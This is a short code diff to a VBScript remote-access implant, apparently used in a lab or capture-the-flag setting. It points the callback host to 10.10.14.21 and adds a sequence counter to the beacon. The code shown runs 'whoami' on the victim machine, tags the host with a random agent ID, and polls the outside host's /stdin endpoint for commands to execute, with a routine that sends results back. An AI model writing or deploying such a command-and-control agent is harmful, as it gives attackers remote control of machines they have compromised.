@@ -6,7 +6,8 @@ On Error Resume Next
 
 agent = ""
 whoami = ""
-CALLBACKURL = "http://192.168.122.1:3000"
+sequence = 0
+CALLBACKURL = "http://10.10.14.21"
 
 Function randbytes(n):
     randomize
@@ -59,7 +60,8 @@ Function get_command()
         agent = str2hex(randbytes(4))
         whoami = str2hex(replace(replace(shell_exec("whoami"), Chr(13), ""), Chr(10), ""))
     End If
-    get_command = http_get(CALLBACKURL & "/stdin?agent=" & agent & "&whoami=" & whoami)
+    sequence = sequence + 1
+    get_command = http_get(CALLBACKURL & "/stdin?agent=" & agent & "&whoami=" & whoami & "&sequence=" & CStr(sequence))
 End Function
 
 Sub send_output(output)
